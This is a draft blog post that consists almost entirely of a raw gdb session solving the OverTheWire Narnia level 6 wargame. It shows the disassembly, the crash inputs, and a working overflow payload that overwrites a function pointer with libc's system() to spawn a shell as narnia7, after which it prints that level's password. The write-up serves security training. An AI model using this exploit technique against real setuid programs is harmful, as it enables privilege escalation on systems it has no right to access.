+++
title = "Over the wire - narnia06"
description = "Over the wire - narnia06"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-06"
project_url = "https://greyhat.dk/over-the-wire-narnia-06"
type = "post"
+++


http://www.cplusplus.com/reference/cstdlib/system/

narnia6@melinda:~$ gdb -q /narnia/narnia6
Reading symbols from /narnia/narnia6...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048559 <+0>:	push   ebp
   0x0804855a <+1>:	mov    ebp,esp
   0x0804855c <+3>:	push   ebx
   0x0804855d <+4>:	and    esp,0xfffffff0
   0x08048560 <+7>:	sub    esp,0x30
   0x08048563 <+10>:	mov    DWORD PTR [esp+0x28],0x80483f0
   0x0804856b <+18>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804856f <+22>:	je     0x8048592 <main+57>
   0x08048571 <+24>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048574 <+27>:	mov    eax,DWORD PTR [eax]
   0x08048576 <+29>:	mov    DWORD PTR [esp+0x4],eax
   0x0804857a <+33>:	mov    DWORD PTR [esp],0x8048750
   0x08048581 <+40>:	call   0x80483d0 <printf@plt>
   0x08048586 <+45>:	mov    DWORD PTR [esp],0xffffffff
   0x0804858d <+52>:	call   0x8048410 <exit@plt>
   0x08048592 <+57>:	mov    DWORD PTR [esp+0x2c],0x0
   0x0804859a <+65>:	jmp    0x80485de <main+133>
   0x0804859c <+67>:	mov    eax,ds:0x80499a0
   0x080485a1 <+72>:	mov    edx,DWORD PTR [esp+0x2c]
   0x080485a5 <+76>:	shl    edx,0x2
   0x080485a8 <+79>:	add    eax,edx
   0x080485aa <+81>:	mov    eax,DWORD PTR [eax]
   0x080485ac <+83>:	mov    DWORD PTR [esp],eax
   0x080485af <+86>:	call   0x8048420 <strlen@plt>
   0x080485b4 <+91>:	mov    edx,DWORD PTR ds:0x80499a0
   0x080485ba <+97>:	mov    ecx,DWORD PTR [esp+0x2c]
   0x080485be <+101>:	shl    ecx,0x2
   0x080485c1 <+104>:	add    edx,ecx
   0x080485c3 <+106>:	mov    edx,DWORD PTR [edx]
   0x080485c5 <+108>:	mov    DWORD PTR [esp+0x8],eax
   0x080485c9 <+112>:	mov    DWORD PTR [esp+0x4],0x0
   0x080485d1 <+120>:	mov    DWORD PTR [esp],edx
   0x080485d4 <+123>:	call   0x8048440 <memset@plt>
   0x080485d9 <+128>:	add    DWORD PTR [esp+0x2c],0x1
   0x080485de <+133>:	mov    eax,ds:0x80499a0
   0x080485e3 <+138>:	mov    edx,DWORD PTR [esp+0x2c]
   0x080485e7 <+142>:	shl    edx,0x2
   0x080485ea <+145>:	add    eax,edx
   0x080485ec <+147>:	mov    eax,DWORD PTR [eax]
   0x080485ee <+149>:	test   eax,eax
   0x080485f0 <+151>:	jne    0x804859c <main+67>
   0x080485f2 <+153>:	mov    DWORD PTR [esp+0x2c],0x3
   0x080485fa <+161>:	jmp    0x8048641 <main+232>
   0x080485fc <+163>:	mov    eax,DWORD PTR [esp+0x2c]
   0x08048600 <+167>:	lea    edx,[eax*4+0x0]
   0x08048607 <+174>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804860a <+177>:	add    eax,edx
   0x0804860c <+179>:	mov    eax,DWORD PTR [eax]
   0x0804860e <+181>:	mov    DWORD PTR [esp],eax
   0x08048611 <+184>:	call   0x8048420 <strlen@plt>
   0x08048616 <+189>:	mov    edx,DWORD PTR [esp+0x2c]
   0x0804861a <+193>:	lea    ecx,[edx*4+0x0]
   0x08048621 <+200>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048624 <+203>:	add    edx,ecx
   0x08048626 <+205>:	mov    edx,DWORD PTR [edx]
   0x08048628 <+207>:	mov    DWORD PTR [esp+0x8],eax
   0x0804862c <+211>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048634 <+219>:	mov    DWORD PTR [esp],edx
   0x08048637 <+222>:	call   0x8048440 <memset@plt>
   0x0804863c <+227>:	add    DWORD PTR [esp+0x2c],0x1
   0x08048641 <+232>:	mov    eax,DWORD PTR [esp+0x2c]
   0x08048645 <+236>:	lea    edx,[eax*4+0x0]
   0x0804864c <+243>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804864f <+246>:	add    eax,edx
   0x08048651 <+248>:	mov    eax,DWORD PTR [eax]
   0x08048653 <+250>:	test   eax,eax
   0x08048655 <+252>:	jne    0x80485fc <main+163>
   0x08048657 <+254>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804865a <+257>:	add    eax,0x4
   0x0804865d <+260>:	mov    eax,DWORD PTR [eax]
   0x0804865f <+262>:	mov    DWORD PTR [esp+0x4],eax
   0x08048663 <+266>:	lea    eax,[esp+0x20]
   0x08048667 <+270>:	mov    DWORD PTR [esp],eax
   0x0804866a <+273>:	call   0x80483e0 <strcpy@plt>
   0x0804866f <+278>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048672 <+281>:	add    eax,0x8
   0x08048675 <+284>:	mov    eax,DWORD PTR [eax]
   0x08048677 <+286>:	mov    DWORD PTR [esp+0x4],eax
   0x0804867b <+290>:	lea    eax,[esp+0x18]
   0x0804867f <+294>:	mov    DWORD PTR [esp],eax
   0x08048682 <+297>:	call   0x80483e0 <strcpy@plt>
   0x08048687 <+302>:	mov    eax,DWORD PTR [esp+0x28]
   0x0804868b <+306>:	and    eax,0xff000000
   0x08048690 <+311>:	mov    ebx,eax
   0x08048692 <+313>:	call   0x804854d <get_sp>
   0x08048697 <+318>:	cmp    ebx,eax
   0x08048699 <+320>:	jne    0x80486a7 <main+334>
   0x0804869b <+322>:	mov    DWORD PTR [esp],0xffffffff
   0x080486a2 <+329>:	call   0x8048410 <exit@plt>
   0x080486a7 <+334>:	lea    eax,[esp+0x20]
   0x080486ab <+338>:	mov    DWORD PTR [esp],eax
   0x080486ae <+341>:	mov    eax,DWORD PTR [esp+0x28]
   0x080486b2 <+345>:	call   eax
   0x080486b4 <+347>:	mov    DWORD PTR [esp],0x1
   0x080486bb <+354>:	call   0x8048410 <exit@plt>
End of assembler dump.
(gdb) r $(python -c 'print "A"*8') $(python -c 'print "B"*8')
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*8') $(python -c 'print "B"*8')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()
(gdb) i reg
eax            0x8048300	134513408
ecx            0xffffd8ad	-10067
edx            0xffffd698	-10600
ebx            0x8000000	134217728
esp            0xffffd680	0xffffd680
ebp            0xffffd6b8	0xffffd6b8
esi            0x0	0
edi            0x80486b4	134514356
eip            0x8048301	0x8048301
eflags         0x10207	[ CF PF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) r $(python -c 'print "A"*12') $(python -c 'print "B"*12')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*12') $(python -c 'print "B"*12')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i reg
eax            0x41414141	1094795585
ecx            0xffffd8a9	-10071
edx            0xffffd698	-10600
ebx            0x41000000	1090519040
esp            0xffffd67c	0xffffd67c
ebp            0xffffd6b8	0xffffd6b8
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10207	[ CF PF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) r $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh")
/bin/bash: -c: line 0: unexpected EOF while looking for matching `''
/bin/bash: -c: line 1: syntax error: unexpected end of file
During startup program exited with code 1.
(gdb) r $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh"')
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh"')
$
$ exit
[Inferior 1 (process 7457) exited with code 01]
(gdb)
(gdb) quit
narnia6@melinda:~$
narnia6@melinda:~$
narnia6@melinda:~$
narnia6@melinda:~$
narnia6@melinda:~$
narnia6@melinda:~$
narnia6@melinda:~$
narnia6@melinda:~$ gdb -q /narnia/narnia6
Reading symbols from /narnia/narnia6...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048559 <+0>:	push   ebp
   0x0804855a <+1>:	mov    ebp,esp
   0x0804855c <+3>:	push   ebx
   0x0804855d <+4>:	and    esp,0xfffffff0
   0x08048560 <+7>:	sub    esp,0x30
   0x08048563 <+10>:	mov    DWORD PTR [esp+0x28],0x80483f0
   0x0804856b <+18>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804856f <+22>:	je     0x8048592 <main+57>
   0x08048571 <+24>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048574 <+27>:	mov    eax,DWORD PTR [eax]
   0x08048576 <+29>:	mov    DWORD PTR [esp+0x4],eax
   0x0804857a <+33>:	mov    DWORD PTR [esp],0x8048750
   0x08048581 <+40>:	call   0x80483d0 <printf@plt>
   0x08048586 <+45>:	mov    DWORD PTR [esp],0xffffffff
   0x0804858d <+52>:	call   0x8048410 <exit@plt>
   0x08048592 <+57>:	mov    DWORD PTR [esp+0x2c],0x0
   0x0804859a <+65>:	jmp    0x80485de <main+133>
   0x0804859c <+67>:	mov    eax,ds:0x80499a0
   0x080485a1 <+72>:	mov    edx,DWORD PTR [esp+0x2c]
   0x080485a5 <+76>:	shl    edx,0x2
   0x080485a8 <+79>:	add    eax,edx
   0x080485aa <+81>:	mov    eax,DWORD PTR [eax]
   0x080485ac <+83>:	mov    DWORD PTR [esp],eax
   0x080485af <+86>:	call   0x8048420 <strlen@plt>
   0x080485b4 <+91>:	mov    edx,DWORD PTR ds:0x80499a0
   0x080485ba <+97>:	mov    ecx,DWORD PTR [esp+0x2c]
   0x080485be <+101>:	shl    ecx,0x2
   0x080485c1 <+104>:	add    edx,ecx
   0x080485c3 <+106>:	mov    edx,DWORD PTR [edx]
   0x080485c5 <+108>:	mov    DWORD PTR [esp+0x8],eax
   0x080485c9 <+112>:	mov    DWORD PTR [esp+0x4],0x0
   0x080485d1 <+120>:	mov    DWORD PTR [esp],edx
   0x080485d4 <+123>:	call   0x8048440 <memset@plt>
   0x080485d9 <+128>:	add    DWORD PTR [esp+0x2c],0x1
   0x080485de <+133>:	mov    eax,ds:0x80499a0
   0x080485e3 <+138>:	mov    edx,DWORD PTR [esp+0x2c]
   0x080485e7 <+142>:	shl    edx,0x2
   0x080485ea <+145>:	add    eax,edx
   0x080485ec <+147>:	mov    eax,DWORD PTR [eax]
   0x080485ee <+149>:	test   eax,eax
   0x080485f0 <+151>:	jne    0x804859c <main+67>
   0x080485f2 <+153>:	mov    DWORD PTR [esp+0x2c],0x3
   0x080485fa <+161>:	jmp    0x8048641 <main+232>
   0x080485fc <+163>:	mov    eax,DWORD PTR [esp+0x2c]
   0x08048600 <+167>:	lea    edx,[eax*4+0x0]
   0x08048607 <+174>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804860a <+177>:	add    eax,edx
   0x0804860c <+179>:	mov    eax,DWORD PTR [eax]
   0x0804860e <+181>:	mov    DWORD PTR [esp],eax
   0x08048611 <+184>:	call   0x8048420 <strlen@plt>
   0x08048616 <+189>:	mov    edx,DWORD PTR [esp+0x2c]
   0x0804861a <+193>:	lea    ecx,[edx*4+0x0]
   0x08048621 <+200>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048624 <+203>:	add    edx,ecx
   0x08048626 <+205>:	mov    edx,DWORD PTR [edx]
   0x08048628 <+207>:	mov    DWORD PTR [esp+0x8],eax
---Type <return> to continue, or q <return> to quit---
   0x0804862c <+211>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048634 <+219>:	mov    DWORD PTR [esp],edx
   0x08048637 <+222>:	call   0x8048440 <memset@plt>
   0x0804863c <+227>:	add    DWORD PTR [esp+0x2c],0x1
   0x08048641 <+232>:	mov    eax,DWORD PTR [esp+0x2c]
   0x08048645 <+236>:	lea    edx,[eax*4+0x0]
   0x0804864c <+243>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804864f <+246>:	add    eax,edx
   0x08048651 <+248>:	mov    eax,DWORD PTR [eax]
   0x08048653 <+250>:	test   eax,eax
   0x08048655 <+252>:	jne    0x80485fc <main+163>
   0x08048657 <+254>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804865a <+257>:	add    eax,0x4
   0x0804865d <+260>:	mov    eax,DWORD PTR [eax]
   0x0804865f <+262>:	mov    DWORD PTR [esp+0x4],eax
   0x08048663 <+266>:	lea    eax,[esp+0x20]
   0x08048667 <+270>:	mov    DWORD PTR [esp],eax
   0x0804866a <+273>:	call   0x80483e0 <strcpy@plt>
   0x0804866f <+278>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048672 <+281>:	add    eax,0x8
   0x08048675 <+284>:	mov    eax,DWORD PTR [eax]
   0x08048677 <+286>:	mov    DWORD PTR [esp+0x4],eax
   0x0804867b <+290>:	lea    eax,[esp+0x18]
   0x0804867f <+294>:	mov    DWORD PTR [esp],eax
   0x08048682 <+297>:	call   0x80483e0 <strcpy@plt>
   0x08048687 <+302>:	mov    eax,DWORD PTR [esp+0x28]
   0x0804868b <+306>:	and    eax,0xff000000
   0x08048690 <+311>:	mov    ebx,eax
   0x08048692 <+313>:	call   0x804854d <get_sp>
   0x08048697 <+318>:	cmp    ebx,eax
   0x08048699 <+320>:	jne    0x80486a7 <main+334>
   0x0804869b <+322>:	mov    DWORD PTR [esp],0xffffffff
   0x080486a2 <+329>:	call   0x8048410 <exit@plt>
   0x080486a7 <+334>:	lea    eax,[esp+0x20]
   0x080486ab <+338>:	mov    DWORD PTR [esp],eax
   0x080486ae <+341>:	mov    eax,DWORD PTR [esp+0x28]
   0x080486b2 <+345>:	call   eax
   0x080486b4 <+347>:	mov    DWORD PTR [esp],0x1
   0x080486bb <+354>:	call   0x8048410 <exit@plt>
End of assembler dump.
(gdb) break system
Function "system" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 1 (system) pending.
(gdb) r $(python -c 'print "A"*8') $(python -c 'print "B"*8')
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*8') $(python -c 'print "B"*8')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()
(gdb) i reg
eax            0x8048300	134513408
ecx            0xffffd8ad	-10067
edx            0xffffd698	-10600
ebx            0x8000000	134217728
esp            0xffffd680	0xffffd680
ebp            0xffffd6b8	0xffffd6b8
esi            0x0	0
edi            0x80486b4	134514356
eip            0x8048301	0x8048301
eflags         0x10207	[ CF PF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) r $(python -c 'print "A"*12') $(python -c 'print "B"*12')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*12') $(python -c 'print "B"*12')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i reg
eax            0x41414141	1094795585
ecx            0xffffd8a9	-10071
edx            0xffffd698	-10600
ebx            0x41000000	1090519040
esp            0xffffd67c	0xffffd67c
ebp            0xffffd6b8	0xffffd6b8
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10207	[ CF PF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) break system
Note: breakpoint 1 also set at pc 0xf7e63cd0.
Breakpoint 2 at 0xf7e63cd0
(gdb) r $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia6 $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh"')

Breakpoint 1, 0xf7e63cd0 in system () from /lib32/libc.so.6
(gdb) c
Continuing.
$ exit
[Inferior 1 (process 8155) exited with code 01]
(gdb) quit
narnia6@melinda:~$ /narnia/narnia6 $(python -c 'print "A"*8 + "\xd0\x3c\xe6\xf7"') $(python -c 'print "B"*8 + "/bin/sh"')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
